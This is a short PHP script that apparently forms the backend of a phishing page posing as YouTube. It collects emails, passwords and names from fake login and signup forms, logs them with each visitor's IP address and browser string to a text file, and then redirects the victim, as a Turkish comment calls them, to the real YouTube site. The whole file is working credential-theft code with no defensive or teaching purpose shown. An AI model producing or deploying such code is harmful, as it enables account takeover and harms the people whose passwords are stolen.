<?php
session_start();

$form_type = $_POST['form_type'] ?? 'unknown';
$ip = $_SERVER['HTTP_CLIENT_IP'] ?? $_SERVER['HTTP_X_FORWARDED_FOR'] ?? $_SERVER['REMOTE_ADDR'] ?? 'unknown';
$ua = $_SERVER['HTTP_USER_AGENT'] ?? 'unknown';
$time = date('Y-m-d H:i:s');

if ($form_type === 'login') {
    $user = trim(str_replace(["\r", "\n"], '', $_POST['email'] ?? 'Unknown'));
    $pass = trim(str_replace(["\r", "\n"], '', $_POST['password'] ?? 'Unknown'));
    
    $data = "Username: " . $user . "\nPass: " . $pass . "\n[TYPE] LOGIN\n[TIME] " . $time . "\n[IP] " . $ip . "\n[UA] " . $ua . "\n---\n";
    
} elseif ($form_type === 'signup') {
    $first = trim(str_replace(["\r", "\n"], '', $_POST['first_name'] ?? 'Unknown'));
    $last = trim(str_replace(["\r", "\n"], '', $_POST['last_name'] ?? 'Unknown'));
    $user = trim(str_replace(["\r", "\n"], '', $_POST['email'] ?? 'Unknown'));
    $pass = trim(str_replace(["\r", "\n"], '', $_POST['password'] ?? 'Unknown'));
    
    $data = "Username: " . $user . "\nPass: " . $pass . "\n[TYPE] SIGNUP\n[NAME] " . $first . " " . $last . "\n[TIME] " . $time . "\n[IP] " . $ip . "\n[UA] " . $ua . "\n---\n";
    
} else {
    $data = "[ERROR] Unknown form type\n[TIME] " . $time . "\n[IP] " . $ip . "\n---\n";
}

file_put_contents('usernames.txt', $data, FILE_APPEND | LOCK_EX);

// Kurbanı gerçek YouTube'a yönlendir
header('Location: https://www.youtube.com/');
exit();
?>
